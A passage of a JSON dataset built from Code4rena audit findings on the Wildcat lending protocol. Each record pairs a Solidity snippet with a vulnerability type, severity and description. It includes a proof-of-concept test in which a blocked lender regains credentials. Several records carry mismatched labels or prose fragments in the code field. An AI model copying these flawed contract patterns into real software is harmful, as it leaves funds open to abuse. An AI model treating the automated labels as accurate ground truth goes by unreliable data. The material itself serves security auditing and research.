    "description": "1. **Blocking Accounts from Deposits:** The `blockFromDeposits` function allows the borrower to block an account: function blockFromDeposits(address account) external onlyBorrower { LenderStatus memory status = _lenderStatus[account]; if (status.hasCredential()) {",
    "confidence": 0.9,
    "source": "code4rena",
    "repository": "2024-08-wildcat-findings",
    "audit_source": "code4rena",
    "lines_of_code": 17,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.746,
    "vulnerability_types": [
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": true,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "\nfunction _tryValidateCredential(\n  LenderStatus memory status,\n  address accountAddress,\n  bytes calldata hooksData\n) internal returns (bool) {\n  uint validateSelector = uint32(IRoleProvider.validateCredential.selector);\n  address providerAddress = _readAddress(hooksData);\n  RoleProvider provider = _roleProviders[providerAddress];\n  if (provider.isNull()) return false;\n  uint credentialTimestamp;\n  uint invalidCredentialReturnedSelector = uint32(InvalidCredentialReturned.selector);\n  assembly {\n    // Prepare calldata for the call\n    // Call the provider\n    if call(\n      gas(),\n      providerAddress,\n      0,\n      add(calldataPointer, 0x1c),\n      add(dataLength, 0x64),\n      0,\n      0x20\n    ) {\n      switch lt(returndatasize(), 0x20)\n      case 1 {\n        // Handle invalid return data\n        mstore(0, invalidCredentialReturnedSelector)\n        revert(0x1c, 0x04)\n      }\n      default {\n        credentialTimestamp := and(mload(0), 0xffffffff)\n      }\n    }\n  }\n  // Additional logic...\n}\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Low",
    "title": "Description",
    "description": "In the `AccessControlHooks` contract, there are assembly blocks where low-level calls (`call` and `staticcall`) are made to external addresses without first checking if the target address contains code (i.e., is a contract). This can lead to unexpected behavior if the address is not a contract, potentially causing the function to behave incorrectly or return invalid data. **Affected Functions:** 1. `_tryGetCredential` 2. `_tryValidateCredential` **1. `_tryGetCredential` Function:**",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-08-wildcat-findings",
    "audit_source": "code4rena",
    "lines_of_code": 38,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 1.0,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "\n/**\n * @param _deployer Address of the account that called the factory.\n * @param {} unused extra bytes to match the constructor signature\n *  restrictedFunctions Configuration specifying which functions to apply\n *                            access controls to.\n */\nconstructor(address _deployer, bytes memory /* args */) IHooks() {\n    borrower = _deployer;\n    // ...\n}\n",
    "vulnerability_label": 1,
    "vulnerability_type": "access_control",
    "severity": "Medium",
    "title": "Contract : FixedTermLoanHooks.sol",
    "description": "**Description:** In the `FixedTermLoanHooks` contract, the NatSpec (Ethereum Natural Language Specification Format) comment for the constructor contains incorrect parameter documentation and typos. Specifically, it uses an empty `{}` as a parameter name and refers to `restrictedFunctions`, which is not a parameter of the constructor. This can lead to confusion for developers and users of the contract, potentially causing misuse or misconfiguration. **Code Snippet:** /** * @param _deployer Address of the account that called the factory.",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-08-wildcat-findings",
    "audit_source": "code4rena",
    "lines_of_code": 12,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.374,
    "vulnerability_types": [
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "\nuint invalidCredentialReturnedSelector = uint32(InvalidCredentialReturned.selector);\n// ...\nassembly {\n    if call(...) {\n        // ...\n        // Left-align the error selector by shifting it 224 bits (28 bytes) to the left\n        mstore(0x00, shl(224, invalidCredentialReturnedSelector))\n        // Revert with the error selector (4 bytes) starting from offset 0\n        revert(0x00, 0x04)\n    }\n}\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Medium",
    "title": "Contract: FixedTermLoanHooks.sol",
    "description": "Incorrect Error Message Encoding in Assembly in `FixedTermLoanHooks` **Description:** In the `FixedTermLoanHooks` contract, the assembly code attempts to revert with a custom error but does not correctly encode the error message according to the ABI specification. The error selector is stored without proper alignment, and the `revert` operation uses incorrect offset and length parameters. This leads to improper error handling, making it difficult to debug and potentially causing the contract to behave unexpectedly. **Code Snippet:** uint invalidCredentialReturnedSelector = uint32(InvalidCredentialReturned.selector);",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-08-wildcat-findings",
    "audit_source": "code4rena",
    "lines_of_code": 13,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.402,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": " contract, dividing before multiplying can cause significant loss of precision because the initial division truncates any fractional part, and the subsequent multiplication cannot recover the lost information. This can lead to results that are significantly lower than expected, especially when dealing with small numbers or requiring high precision.\n\n**Actual Behavior Code Snippet:**\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "integer_overflow",
    "severity": "High",
    "title": "Contract : FixedTermLoanHooks.sol",
    "description": "**Description:** In the `FixedTermLoanHooks` contract, performing division before multiplication in integer arithmetic can lead to loss of precision due to integer division truncating fractional parts. In financial calculations, this can result in inaccurate outcomes, potentially affecting the fairness and correctness of transactions. **Code Snippet:** // Hypothetical example within FixedTermLoanHooks, not directly found in the code uint256 result = (a / b) * c;",
    "confidence": 0.9,
    "source": "code4rena",
    "repository": "2024-08-wildcat-findings",
    "audit_source": "code4rena",
    "lines_of_code": 5,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.387,
    "vulnerability_types": [
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": true,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "\nfunction _calculateTemporaryReserveRatioBips(\n    uint256 annualInterestBips,\n    uint256 originalAnnualInterestBips,\n    uint256 originalReserveRatioBips\n) internal pure returns (uint16 temporaryReserveRatioBips) {\n    // Calculate the relative reduction in the interest rate in bips,\n    // bound to a maximum of 100%\n    uint256 relativeDiff = MathUtils.mulDiv(\n        10000,\n        originalAnnualInterestBips - annualInterestBips,\n        originalAnnualInterestBips\n    );\n\n    // Rest of the function...\n}\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Low",
    "title": "[L-19] Division by Zero Vulnerability in Interest Rate Reduction Calculation",
    "description": "**Contract Name:** `MarketConstraintHooks` --- **Description:** A logical flaw exists in the `MarketConstraintHooks` contract where a division by zero error can occur during the calculation of the relative reduction in the annual interest rate (`annualInterestBips`). Specifically, if the `originalAnnualInterestBips` is zero, the function `_calculateTemporaryReserveRatioBips` performs a division by zero, causing the contract to revert. This vulnerability can disrupt the contract's functionality and potentially be exploited to cause a denial of service. ---",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-08-wildcat-findings",
    "audit_source": "code4rena",
    "lines_of_code": 17,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.514,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "\nfunction hasPendingExpiredBatch(MarketState memory state) internal view returns (bool result) {\n  uint256 expiry = state.pendingWithdrawalExpiry;\n  assembly {\n    // Correctly access the 'timestamp' global variable without parentheses\n    result := and(gt(expiry, 0), gt(timestamp, expiry))\n  }\n}\n",
    "vulnerability_label": 1,
    "vulnerability_type": "timestamp_dependence",
    "severity": "Medium",
    "title": "**Solution: Correct the Usage of `timestamp` in Inline Assembly**",
    "description": "To rectify this issue, you need to adjust the inline assembly to correctly reference the `timestamp` global variable without parentheses. Here's the corrected version of the `hasPendingExpiredBatch` function: function hasPendingExpiredBatch(MarketState memory state) internal view returns (bool result) { uint256 expiry = state.pendingWithdrawalExpiry; assembly { // Correctly access the 'timestamp' global variable without parentheses",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-08-wildcat-findings",
    "audit_source": "code4rena",
    "lines_of_code": 9,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.298,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "\nlet createSize := add(size, 0x0b) // Incorrect calculation\n",
    "vulnerability_label": 1,
    "vulnerability_type": "logic_error",
    "severity": "Medium",
    "title": "Actual Behavior Code Snippet",
    "description": "The incorrect code causing this issue is: let createSize := add(size, 0x0b) // Incorrect calculation -----------------------------------------",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-08-wildcat-findings",
    "audit_source": "code4rena",
    "lines_of_code": 3,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.06,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      1
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "\nfunction _packString(string memory str) internal pure returns (bytes32 word0, bytes32 word1) {\n    assembly {\n        let length := mload(str)\n        // Equivalent to:\n        // if (str.length > 63) revert NameOrSymbolTooLong();\n        if gt(length, 0x3f) {\n            mstore(0, 0x19a65cb6)\n            revert(0x1c, 0x04)\n        }\n-        // Load the length and first 31 bytes of the string into the first word\n-        // by reading from 31 bytes after the length pointer.\n-        word0 := mload(add(str, 0x1f))\n-        // If the string is less than 32 bytes, the second word will be zeroed out.\n-        word1 := mul(mload(add(str, 0x3f)), gt(mload(str), 0x1f))\n+        // Load the length and first 32 bytes of the string into the first word\n+        // by reading from 32 bytes after the length pointer.\n+        word0 := mload(add(str, 0x20))\n+        // If the string is less than 32 bytes, the second word will be zeroed out.\n+        word1 := mload(add(str, 0x40))\n    }\n}\n",
    "vulnerability_label": 1,
    "vulnerability_type": "logic_error",
    "severity": "Low",
    "title": "[L-22] Logical Error in `_packString` Function Leading to Incorrect Token Names and Symbols",
    "description": "**Contract Name:** `HooksFactory` **Description:** The `_packString` function in the `HooksFactory` contract is designed to efficiently pack a string of up to 63 bytes into two `bytes32` words for storage or processing. However, due to incorrect memory offset calculations in the assembly code, the function fails to correctly pack the string data. This results in incorrect token names and symbols for deployed markets, leading to confusion, misrepresentation, and potential security risks. **Code Snippet:** function _packString(string memory str) internal pure returns (bytes32 word0, bytes32 word1) {",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-08-wildcat-findings",
    "audit_source": "code4rena",
    "lines_of_code": 23,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.99,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      1
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "solidity\n  function _queueWithdrawal(\n    MarketState memory state,\n    Account memory account,\n    address accountAddress,\n    uint104 scaledAmount,\n    uint normalizedAmount,\n    uint baseCalldataSize\n  ) internal returns (uint32 expiry) {\n\n    // Cache batch expiry on the stack for gas savings\n    expiry = state.pendingWithdrawalExpiry;\n\n    // If there is no pending withdrawal batch, create a new one.\n    if (state.pendingWithdrawalExpiry == 0) {\n      // @audit If the market is closed, use zero for withdrawal batch duration.\n      uint duration = state.isClosed.ternary(0, withdrawalBatchDuration);\n      expiry = uint32(block.timestamp + duration);\n      emit_WithdrawalBatchCreated(expiry);\n      state.pendingWithdrawalExpiry = expiry;\n    }\n  }\n\n  function _executeWithdrawal(\n    MarketState memory state,\n    address accountAddress,\n    uint32 expiry,\n    uint baseCalldataSize\n  ) internal returns (uint256) {\n    WithdrawalBatch memory batch = _withdrawalData.batches[expiry];\n    // @audit If the market is closed, allow withdrawal prior to expiry.\n    if (expiry >= block.timestamp && !state.isClosed) {\n      revert_WithdrawalBatchNotExpired();\n    }\n  }\n\n  function getAvailableWithdrawalAmount(\n    address accountAddress,\n    uint32 expiry\n  ) external view nonReentrantView returns (uint256) {\n    @audit If the market is closed, getAvailableWithdrawalAmount may still revert\n    if (expiry >= block.timestamp) {\n      revert_WithdrawalBatchNotExpired();\n    }\n  }\n",
    "vulnerability_label": 1,
    "vulnerability_type": "reentrancy",
    "severity": "Low",
    "title": "Description",
    "description": "function _queueWithdrawal( MarketState memory state, Account memory account, address accountAddress, uint104 scaledAmount,",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-08-wildcat-findings",
    "audit_source": "code4rena",
    "lines_of_code": 46,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 1.0,
    "vulnerability_types": [
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "\n  function testRegainCreds() external {\n    parameters.hooksConfig = parameters.hooksConfig.setFlag(Bit_Enabled_Transfer);\n    BaseMarketTest.setUpContracts(true);\n    token = IERC20(address(market));\n    MarketState memory state;\n    _mint(bob, 1 ether);\n    _mint(alice, 1 ether);\n    //bob's credentials removed & blocked from depositing\n    _blockLender(bob);\n    vm.prank(bob);\n    //bob calls the hook directly and instantly regains credentials (but is still blocked from depositing)\n    hooks.onQueueWithdrawal(bob,0,0,state,'');\n  }\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Low",
    "title": "Proof of Concept",
    "description": "Add the following test to `WildcatMarketToken.t.sol`: function testRegainCreds() external { parameters.hooksConfig = parameters.hooksConfig.setFlag(Bit_Enabled_Transfer); BaseMarketTest.setUpContracts(true); token = IERC20(address(market));",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-08-wildcat-findings",
    "audit_source": "code4rena",
    "lines_of_code": 15,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.542,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\n function test_offByOneErrorInFixedTermWithdrawal() external {\n\n        // Setup\n        uint32 fixedTermEndTime = uint32(block.timestamp + 30 days);\n        address marketAddress = address(1);\n        address testAccount = address(this);\n\n\n        // Set up the market with a fixed term\n        hooks.setHookedMarket(\n            marketAddress,\n            HookedMarket({\n                isHooked: true,\n                transferRequiresAccess: false,\n                depositRequiresAccess: false,\n                withdrawalRequiresAccess: true,\n                minimumDeposit: 0,\n                fixedTermEndTime: fixedTermEndTime\n            })\n        );\n\n        // Grant withdrawal access to the test account\n        hooks.addRoleProvider(address(this), 365 days);\n        hooks.grantRole(testAccount, uint32(block.timestamp));\n\n        // Mark the test account as a known lender on the market\n        hooks.setIsKnownLender(testAccount, marketAddress, true);\n\n        // Test withdrawals\n        MarketState memory state;\n        vm.startPrank(marketAddress);\n\n        // 1. Attempt to withdraw 1 second before fixedTermEndTime (should fail)\n        vm.warp(fixedTermEndTime - 1);\n        vm.expectRevert(FixedTermLoanHooks.WithdrawBeforeTermEnd.selector);\n        hooks.onQueueWithdrawal(testAccount, 0, 1, state, \"\");\n\n        // 2. Attempt to withdraw exactly at fixedTermEndTime (should fail, but doesn't due to the bug)\n        vm.warp(fixedTermEndTime);\n        bool successAtExactTime = true;\n        try hooks.onQueueWithdrawal(testAccount, 0, 1, state, \"\") {\n            // If this succeeds, it confirms the off-by-one error\n            successAtExactTime = true;\n\n        } catch {\n            // If this fails, the off-by-one error is not present\n            successAtExactTime = false;\n        }\n\n        assertTrue(successAtExactTime, \"Withdrawal at exact end time should fail but succeeded (off-by-one error)\");\n\n        // 3. Attempt to withdraw 1 second after fixedTermEndTime (should succeed)\n        vm.warp(fixedTermEndTime + 1);\n        hooks.onQueueWithdrawal(testAccount, 0, 1, state, \"\");\n        vm.stopPrank();\n    }\n}\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Low",
    "title": "Description:",
    "description": "The FixedTermLoanHooks contract is designed to enforce a fixed-term loan period, after which withdrawals are permitted. However, the current implementation allows withdrawals to occur at the exact moment the fixed term ends, rather than enforcing a strict \"after end time\" rule. In the `onQueueWithdrawal` function, the check for withdrawal timing is implemented as follows: function onQueueWithdrawal( address lender, uint32 /* expiry */,",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-08-wildcat-findings",
    "audit_source": "code4rena",
    "lines_of_code": 59,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 1.0,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nif (market.fixedTermEndTime >= block.timestamp) {\n  revert WithdrawBeforeTermEnd();\n}\n",
    "vulnerability_label": 1,
    "vulnerability_type": "timestamp_dependence",
    "severity": "Low",
    "title": "Recommended Mitigation:",
    "description": "Modify the condition in the `onQueueWithdrawal` function to use a greater-than-or-equal-to comparison: if (market.fixedTermEndTime >= block.timestamp) { revert WithdrawBeforeTermEnd(); } This change ensures that withdrawals are only permitted strictly after the fixed term end time, aligning with the expected behavior of fixed-term loans.",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-08-wildcat-findings",
    "audit_source": "code4rena",
    "lines_of_code": 5,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.095,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "solidity\nif (newExpiry < block.timestamp) revert GrantedCredentialExpired();\n",
    "vulnerability_label": 1,
    "vulnerability_type": "timestamp_dependence",
    "severity": "Low",
    "title": "Description:",
    "description": "In the `FixedTermLoanHooks` contract, the credential expiry check is implemented using a less-than comparison: if (newExpiry < block.timestamp) revert GrantedCredentialExpired(); This condition allows a credential to be considered valid when its expiry time is exactly equal to the current block timestamp. While this approach is more permissive, it could lead to unexpected behavior in scenarios where strict time bounds are crucial.",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-08-wildcat-findings",
    "audit_source": "code4rena",
    "lines_of_code": 3,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.077,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "\n   This will ensure that credentials are considered expired exactly at their expiry time.\n\n2. Consider adding a small buffer time (e.g., a few seconds) to the expiry check to account for potential block time variations:\n   ",
    "vulnerability_label": 1,
    "vulnerability_type": "timestamp_dependence",
    "severity": "High",
    "title": "Recommended mitigations:",
    "description": "1. If strict timing is required, consider changing the condition to: if (newExpiry <= block.timestamp) revert GrantedCredentialExpired(); This will ensure that credentials are considered expired exactly at their expiry time. 2. Consider adding a small buffer time (e.g., a few seconds) to the expiry check to account for potential block time variations: if (newExpiry < block.timestamp + EXPIRY_BUFFER) revert GrantedCredentialExpired();",
    "confidence": 0.9,
    "source": "code4rena",
    "repository": "2024-08-wildcat-findings",
    "audit_source": "code4rena",
    "lines_of_code": 5,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.224,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": true,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "\n\n3. Implement a minimum transfer threshold to prevent issues with fractional amounts rounding down to zero.\n\n4. For the ",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Medium",
    "title": "Recommended mitigations:",
    "description": "1. Add a zero-value check before executing transfers: if (amount > 0) { asset.safeTransfer(recipient, amount); } 2. For the `borrow` function, consider reverting if a zero amount is requested:",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-08-wildcat-findings",
    "audit_source": "code4rena",
    "lines_of_code": 5,
    "has_external_calls": true,
    "has_state_changes": false,
    "complexity_score": 0.121,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "disableHooksTemplate",
    "vulnerability_label": 1,
    "vulnerability_type": "dos",
    "severity": "Low",
    "title": "Description:",
    "description": "The HooksFactory contract maintains an array `_hooksTemplates` to keep track of all hooks templates. New templates are added to this array in the `addHooksTemplate` function, but there is no corresponding functionality to remove templates from the array. While templates can be disabled via the `disableHooksTemplate` function, this only sets a flag in a separate mapping and does not remove the template from the array. This design can lead to an ever-growing array, which could cause the following issues: 1. Increased gas costs for functions that iterate over or return the entire array. 2. Potential block gas limit issues if the array grows too large. 3. Inconsistencies between the array contents and the actual state of enabled templates.",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-08-wildcat-findings",
    "audit_source": "code4rena",
    "lines_of_code": 1,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.02,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      1,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "solidity\nfunction removeHooksTemplate(address hooksTemplate) external onlyArchControllerOwner {\n    uint256 index = _templateDetails[hooksTemplate].index;\n    require(index < _hooksTemplates.length, \"Template not found\");\n    \n    // Move the last element to the position of the removed element\n    _hooksTemplates[index] = _hooksTemplates[_hooksTemplates.length - 1];\n    _templateDetails[_hooksTemplates[index]].index = index;\n    \n    // Remove the last element\n    _hooksTemplates.pop();\n    \n    // Clear the template details\n    delete _templateDetails[hooksTemplate];\n    \n    emit HooksTemplateRemoved(hooksTemplate);\n}\n",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Low",
    "title": "Recommended Mitigations:",
    "description": "1. Implement a function to remove disabled templates from the `_hooksTemplates` array. This could be combined with the existing `disableHooksTemplate` function. 2. Consider using a different data structure, such as a mapping with a separate array for keys, which would allow for easier removal of elements. Example mitigation (option 1): function removeHooksTemplate(address hooksTemplate) external onlyArchControllerOwner { uint256 index = _templateDetails[hooksTemplate].index;",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-08-wildcat-findings",
    "audit_source": "code4rena",
    "lines_of_code": 18,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.628,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "\n\n2. Alternatively, lock the contract to a specific Solidity version:\n\n   ",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Low",
    "title": "Recommended mitigations:",
    "description": "1. Specify both a lower and upper bound for the Solidity version: pragma solidity >=0.8.20 <0.9.0; 2. Alternatively, lock the contract to a specific Solidity version: pragma solidity 0.8.20; By implementing a bounded Solidity version pragma the protocol can significantly reduce the risk of unexpected behavior and potential vulnerabilities introduced by future compiler versions.",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-08-wildcat-findings",
    "audit_source": "code4rena",
    "lines_of_code": 5,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.074,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "_marketsByHooksTemplate",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Low",
    "title": "Low 10 - Unbounded Mapping Array `_marketsByHooksTemplate`",
    "description": "",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-08-wildcat-findings",
    "audit_source": "code4rena",
    "lines_of_code": 1,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.023,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": " iterate over this array. If the number of markets for a specific hooks template becomes very large, these iterations could consume excessive gas or potentially hit block gas limits, rendering the functions unusable.\n\nMitigating factors include:\n1. Pagination in ",
    "vulnerability_label": 1,
    "vulnerability_type": "dos",
    "severity": "Medium",
    "title": "Description",
    "description": "The `_marketsByHooksTemplate` mapping in the contract is an unbounded array that stores markets for each hooks template. This array is appended to in the `_deployMarket` function: _marketsByHooksTemplate[hooksTemplate].push(market); Functions like `getMarketsForHooksTemplate` and `pushProtocolFeeBipsUpdates` iterate over this array. If the number of markets for a specific hooks template becomes very large, these iterations could consume excessive gas or potentially hit block gas limits, rendering the functions unusable. Mitigating factors include: 1. Pagination in `getMarketsForHooksTemplate`",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-08-wildcat-findings",
    "audit_source": "code4rena",
    "lines_of_code": 4,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.263,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      1,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "pushProtocolFeeBipsUpdates",
    "vulnerability_label": 1,
    "vulnerability_type": "integer_overflow",
    "severity": "Medium",
    "title": "Overview:",
    "description": "The `pushProtocolFeeBipsUpdates` function in the HooksFactory contract performs arithmetic operations directly within an array index. This practice can lead to readability issues, potential bugs in more complex scenarios, and difficulties in debugging.",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-08-wildcat-findings",
    "audit_source": "code4rena",
    "lines_of_code": 1,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.026,
    "vulnerability_types": [
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nuint256 marketIndex = marketStartIndex + i;\naddress market = markets[marketIndex];\n",
    "vulnerability_label": 1,
    "vulnerability_type": "integer_overflow",
    "severity": "Low",
    "title": "Recommended Mitigations:",
    "description": "1. Separate the index calculation from the array access: uint256 marketIndex = marketStartIndex + i; address market = markets[marketIndex]; 2. Consider using SafeMath or Solidity 0.8.x's built-in overflow checking for the index calculation in more complex scenarios. 3. Add explicit bounds checking before accessing the array, if not already present elsewhere in the function.",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-08-wildcat-findings",
    "audit_source": "code4rena",
    "lines_of_code": 4,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.092,
    "vulnerability_types": [
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "_loopTryGetCredential",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Medium",
    "title": "Overview:",
    "description": "The `_loopTryGetCredential` function in the FixedTermLoanHooks contract iterates over an unbounded `_pullProviders` array, which could lead to excessive gas consumption and scalability issues if the number of role providers grows significantly.",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-08-wildcat-findings",
    "audit_source": "code4rena",
    "lines_of_code": 1,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.021,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "solidity\n  function deployMarket(\n    DeployMarketInputs calldata parameters,\n    bytes calldata hooksData,\n    bytes32 salt,\n    address originationFeeAsset,\n    uint256 originationFeeAmount\n  ) external override nonReentrant returns (address market) {\n    if (!IWildcatArchController(_archController).isRegisteredBorrower(msg.sender)) {\n      revert NotApprovedBorrower();\n    }\n    address hooksInstance = parameters.hooks.hooksAddress();\n    address hooksTemplate = getHooksTemplateForInstance[hooksInstance];\n    if (hooksTemplate == address(0)) {\n      revert HooksInstanceNotFound();\n    }\n    HooksTemplate memory templateDetails = _templateDetails[hooksTemplate];\n    market = _deployMarket(\n      parameters,\n      hooksData,\n      hooksTemplate,\n      templateDetails,\n      salt,\n      originationFeeAsset,\n      originationFeeAmount\n    );\n  }\n",
    "vulnerability_label": 1,
    "vulnerability_type": "reentrancy",
    "severity": "Low",
    "title": "Description",
    "description": "The `HooksFactory` only checks whether the hook instance is registered when deploying the market contract, but does not check if it is disabled. This could allow users to deploy markets using hooks instances that are already deployed but have their configurations disabled. function deployMarket( DeployMarketInputs calldata parameters, bytes calldata hooksData,",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2024-08-wildcat-findings",
    "audit_source": "code4rena",
    "lines_of_code": 28,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.857,
    "vulnerability_types": [
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\n    if (!(address(bytes20(salt)) == msg.sender || bytes20(salt) == bytes20(0))) {\n      revert SaltDoesNotContainSender();\n    }\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Low",
    "title": "Description",
